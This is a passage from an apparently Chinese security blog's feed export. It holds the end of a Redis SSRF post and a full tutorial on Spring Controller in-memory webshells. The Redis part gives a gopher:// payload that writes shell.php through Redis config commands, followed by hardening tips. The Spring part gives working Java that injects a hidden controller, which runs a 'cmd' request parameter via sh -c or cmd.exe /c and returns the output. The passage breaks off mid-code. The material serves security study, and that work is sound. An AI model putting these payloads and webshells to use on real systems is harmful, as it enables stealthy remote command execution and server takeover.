<p>这里我使用的是 <a href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a> 工具</p>
<p>将上述执行的命令写入<code>redis.cmd</code>中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736913439020-371bb3d8-02b2-47a5-928a-e5ea3a7ca15e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736913439020-371bb3d8-02b2-47a5-928a-e5ea3a7ca15e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>保存好后执行<code>python2 redis-over-gopher.py</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736913485254-29f48e20-c783-4265-86aa-778a568ed1f1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736913485254-29f48e20-c783-4265-86aa-778a568ed1f1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>生成payload后，若在在bp中还需要将payload再进行一次url编码</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%0d%0a%31%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%34%0d%0a%2f%74%6d%70%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%30%0d%0<span class="attribute">a</span></span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:6379/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%250d%250a%2531%250d%250a%2524%2531%2538%250d%250a%253c%253f%2570%2568%2570%2520%2570%2568%2570%2569%256e%2566%256f%2528%2529%253b%253f%253e%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2534%250d%250a%252f%2574%256d%2570%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2539%250d%250a%2573%2568%2565%256c%256c%252e%2570%2568%2570%250d%250a%252a%2530%250d%250a</span><br></pre></td></tr></table></figure>



<h2 id="LkjeS">redis安全配置</h2>

<ol>
<li>以普通账号启动redis服务</li>
<li>监听本地或特定主机</li>
<li>开启 protected-mode</li>
<li>更改默认6379端口</li>
<li>为redis设置密码（最好是强密码）</li>
</ol>
<h2 id="nOk6J">小结</h2>
还是挺有意思的一种漏洞，能够配合SSRF攻击内网的Redis未授权访问达到写入文件的目的，最后可以getShell拿到服务器权限



]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring内存马</title>
    <url>/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="vD09Y">Spring内存马</h1>
<h2 id="gxx0g">前言</h2>

<p>Spring内存马常见的有两种，Controller内存马和Interceptor内存马，有了前面学习Tomcat的Filter、Servlet、Listener和Valve内存马的学习，学习Spring内存马感觉到是比较轻松的</p>
<h2 id="kGOtW">Spring基础</h2>

<p>Spring的相关基础，都是之前在一点点瞎学习和审计SpringBoot系统中学到的，也不是很会整理和总结，就不误人子弟了。这里拿出一张我个人感觉不错的流程图，可以根据这个去跟一下Dispatcher的流程。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1709431796433-fc555bfe-d4fa-4203-a47e-aaa6492e306e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1709431796433-fc555bfe-d4fa-4203-a47e-aaa6492e306e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="nAIJC">SpringController内存马</h2>
<h3 id="aGiYG">环境搭建</h3>

<p>环境的配置与版本如下：</p>
<ul>
<li>SpringBoot2.6.13</li>
<li>JDK8u65</li>
<li>Maven3.9.8</li>
</ul>
<p>在IDEA中新建项目，选择SpringBoot模块，类型设置为Maven，JDK我选择用JDK8u65。点击下一步</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754319442708-1c2fb480-b367-4d0f-98d4-d7b17ef99ca4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754319442708-1c2fb480-b367-4d0f-98d4-d7b17ef99ca4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里我选的SpringBoot版本为2.6.13，依赖添加SpringWeb，点击创建即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754319490107-a68ff744-c7df-4059-91a6-326107521935.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754319490107-a68ff744-c7df-4059-91a6-326107521935.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>新建一个Controller，文件内容如下，这样我们的基础环境就搭建好了</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">@<span class="title class_">Controller</span></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">SpringController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    @<span class="title class_">RequestMapping</span>(<span class="string">&quot;/hello&quot;</span>)</span><br><span class="line">    @<span class="title class_">ResponseBody</span></span><br><span class="line">    public <span class="title class_">String</span> <span class="title function_">hello</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754319776341-7e9deab1-a899-471e-aeaf-ea8696ae7ef9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754319776341-7e9deab1-a899-471e-aeaf-ea8696ae7ef9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="kQuls">源码分析</h3>
<h4 id="l0L3h">Controller流程分析</h4>

<p>个人感觉Spring的Controller和Tomcat的Servlet很相似，都作用于路由，可以通过某个特定的路径访问特定的业务逻辑</p>
<p>我们在Controller中下一个断点，走到这里，我们可以看到左下角堆栈信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754357743076-2ed20cc1-5133-4ea6-adf8-5ed2a34d6627.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754357743076-2ed20cc1-5133-4ea6-adf8-5ed2a34d6627.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进入<code>doDispatch</code>方法中，首先通过<code>getHandler</code>方法，获取到对应的Handler，然后再调用<code>getHandlerAdapter</code>方法获取到对应的适配器，最后去调用<code>ha.handler</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754362927026-c53c3c0b-6db1-463f-a568-2a24a6fdb34f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754362927026-c53c3c0b-6db1-463f-a568-2a24a6fdb34f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>getHandler</code>方法中，会寻找我们访问路径所对应的<code>HandlerMapping</code>，其中<code>HandlerMappings</code>中存在五个<code>HandlerMapping</code>，通过迭代器进行遍历，找到匹配的<code>HandlerMapping</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754363187678-fabcc53d-9273-4032-b276-8ad5894a57d4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754363187678-fabcc53d-9273-4032-b276-8ad5894a57d4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>getHandler</code>方法，然后持续跟进<code>getHandlerInternal</code>，<code>mappingRegistry</code>中就存储着我们的路由信息，这里首先对<code>mappingRegistry</code>进行上锁，最后在finally块中，进行解锁，</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754363925809-4111d37c-0dee-47c0-a535-a131c7b38a1a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754363925809-4111d37c-0dee-47c0-a535-a131c7b38a1a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>lookupHandlerMethod</code>方法，这里根据我们访问的路径，获取到了对应的路由</p>
<p>也就是说，我们只需要向mappingRegistry中添加恶意Controller的路由信息，就可以达到注入内存马的效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754364109449-fbd50de1-c36f-46bd-8c57-6444c48b09bb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754364109449-fbd50de1-c36f-46bd-8c57-6444c48b09bb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="J9TFY">Controller注册流程</h4>

<p>在<code>AbstractHandlerMethodMapping</code>的<code>initHanlderMethods</code>方法处下一个断点，来分析Controller注册流程</p>
<p>看到<code>initHandlerMethods</code>方法，遍历所有bean，传入<code>processCandidateBean</code>方法中来处理bean</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754377961602-f41c2f48-c8d1-4adc-851f-fa41f9e821e0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754377961602-f41c2f48-c8d1-4adc-851f-fa41f9e821e0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>processCandidateBean</code>方法中，通过<code>getType</code>方法获取beanType，后续判断该Bean是否为<code>Handler</code>对象，如果是的话，就将其传入<code>detectHandlerMethods</code>方法中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754378508620-bd895428-c4cf-4876-9e9d-11be05b589f4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754378508620-bd895428-c4cf-4876-9e9d-11be05b589f4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>detectHandlerMethods</code>方法中，调用<code>getMappingForMethod</code>来获取到<code>Map</code>类methods，构成为<code>&lt;Method,RequestMapping&gt;</code>，后续通过遍历methods，调用<code>registerHandlerMethod</code>方法执行了注册Controller的操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754378880508-a17a9585-ab2b-47c0-b2f8-c17ea9f68d7e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754378880508-a17a9585-ab2b-47c0-b2f8-c17ea9f68d7e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>持续跟进<code>registerHandlerMethod</code>，最后注册Controller的方法为<code>this.mappingRegistry.register</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754379281458-507ec079-8267-432c-aafa-d7c3f694b1c9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754379281458-507ec079-8267-432c-aafa-d7c3f694b1c9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="qO4eZ">注册Controller</h3>
<h4 id="HpU9N">获取上下文</h4>

<p>对于内存马的注入，最重要的事情就是获取上下文，在Tomcat中获取说的上下文为<code>StandardContext</code>，对于Spring获取的就是<code>WebApplicationContext</code>。</p>
<p>获取上下文常用的方法有五种：</p>
<ol>
<li>ContextLoader</li>
<li>WebApplicationContextUtils</li>
<li>RequestContextUtils</li>
<li>getAttribute</li>
<li>反射获取</li>
</ol>
<h5 id="zX2Ok">ContextLoader</h5>

<p>直接通过ContextLoader获取，获取到当前<code>ContextLoader</code>创建的<code>WebApplicationContext</code>（一般ContextLoader会被ban）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure>

<h5 id="N1FMU">WebApplicationContextUtils</h5>

<p>该工具类的<code>getWebApplicationContext</code>方法也是获取到<code>ContextLoaderListener</code>所创建的ROOT<code>WebApplicationContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure>

<blockquote>
<p>需要注意的是，在spring 5之后的的WebApplicationContextUtils已经没有getWebApplicationContext方法</p>
</blockquote>
<h5 id="c7wF3">RequestContextUtils</h5>

<p>通过<code>RequestContextHolder</code>获取request，然后获取servletRequest后通过<code>RequestContextUtils</code>获取ROOT<code>WebApplicationContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure>

<h5 id="cLoQl">getAttribute</h5>

<p>用<code>RequestContextHolder</code>方法直接从键值<code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code>中获取Context即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h5 id="El65d">反射获取</h5>

<p>最后也可以直接通过反射获取<code>WebApplicationContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure>

<h4 id="X8lcU">注册Controller</h4>

<p>在Spring2.5 - 3.1中使用<code>defaultAnnotationHandlerMapping</code>处理URL映射。在Spring3.1之后使用<code>RequestMappingHandlerMapping</code>方法</p>
<p>在模拟注册Controller时，一般有三种方法</p>
<h5 id="JJmzD">registryMapping</h5>

<p>根据上面的源码分析，可以直接将<code>Controller</code>直接注册进registryMapping</p>
<p>现在想要将<code>Controller</code>注册去，那么我们就要获取到registryMapping，而该参数可以直接通过调用<code>WebApplicationContext</code>的<code>getBean</code>方法获取，上面说了怎么获取上下文，因此使用以下代码即可获取registryMapping</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure>

<p>在调用<code>RegistryMapping</code>注册时，需要传入三个参数：<code>RequestMappingInfo</code>、<code>Controller</code>、<code>Method</code>，因此这三个参数是我们所需要构造的</p>
<p>创建<code>RequestMappingInfo</code>，需要传入<code>PatternsRequestCondition</code>（Controller映射的URL）和<code>RequestMethodsRequestCondition</code>（HTTP的请求方法）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/memShell&quot;</span>);</span><br><span class="line"><span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>恶意Controller就是我们的核心，内容如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectedController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectedController</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">            response.getWriter().close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后需要创建<code>Method</code>，就是我们想要触发的Controller中的方法，这里我们通过反射获取该方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> InjectedController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>最后调用<code>RegistryMapping</code>方法进行注册即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br></pre></td></tr></table></figure>

<h5 id="ezroZ">detectHandlerMethods</h5>

<p>在上面分析注册流程时，<code>detectHandelerMethods</code>中，用<code>getMappingForMethod</code>获取了<code>RequestMappingInfo</code>，然后调用<code>registerHandlerMethod</code>方法进行调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754378880508-a17a9585-ab2b-47c0-b2f8-c17ea9f68d7e.png?x-oss-process=image/format,webp" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754378880508-a17a9585-ab2b-47c0-b2f8-c17ea9f68d7e.png?x-oss-process=image/format,webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里由于<code>detectHandlerMethods</code>为protect作用域，因此需要通过反射调用该方法（在使用该方法注册Controller的时候，我们构造的恶意Controller需要用注解指定路径，例如<code>@RequestMapping(&quot;/backdoor&quot;)</code>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在上下文中注册一个名为 dynamicController 的 Webshell controller</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>, Class.forName(<span class="string">&quot;org.example.springmvc.InjectedController&quot;</span>).newInstance());</span><br><span class="line"><span class="comment">//从上下文中获得 RequestMappingHandlerMapping</span></span><br><span class="line">org.springframework.web.servlet.mvc.method.annotation.<span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="comment">//反射获得 detectHandlerMethods Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="string">&quot;detectHandlerMethods&quot;</span>, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//通过反射将 dynamicController 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(requestMappingHandlerMapping, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="ftvOG">registerHandler</h5>

<p>上面两种方法适用于spring3.1之后，<code>RequestMappingHandlerMapping</code>为映射器时。当使用<code>DefaultAnnotationHandlerMapping</code>作为映射器时，可以使用该类顶层父类的<code>registerHandler</code>方法来注册<code>controller</code>，但是不太常用了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在上下文中注册一个名为 dynamicController 的 Webshell controller</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>, Class.forName(<span class="string">&quot;org.example.springmvc.InjectedController&quot;</span>).newInstance());</span><br><span class="line"><span class="comment">//从上下文中获得 DefaultAnnotationHandlerMapping</span></span><br><span class="line">org.springframework.web.servlet.mvc.annotation.<span class="type">DefaultAnnotationHandlerMapping</span>  <span class="variable">dh</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);</span><br><span class="line"><span class="comment">//反射获得 registerHandler Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="string">&quot;registerHandler&quot;</span>, String.class, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//将 dynamicController 和 URL 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(dh, <span class="string">&quot;/favicon&quot;</span>, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="wVDd7">完整测试代码</h4>

<p>在真实环境下，肯定是不是这样注入的，而是通过jsp文件或者反序列化注入，但是Spring默认不支持JSP文件的解析，应该大部分都是通过反序列化注入的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/Evil&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">InjectController</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">//获取当前上下文环境</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动注册Controller</span></span><br><span class="line">        <span class="comment">//从上下文中获得 RequestMappingHandlerMapping</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="comment">//通过反射获得controller中的Method</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> evalController.class.getDeclaredMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">        <span class="comment">//定义controller的路径</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">        <span class="comment">//定义访问controller的HTTP方法（GET/POST）</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 5. 在内存中动态注册 controller</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        r.registerMapping(info, <span class="keyword">new</span> <span class="title class_">evalController</span>(), method);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evalController</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span 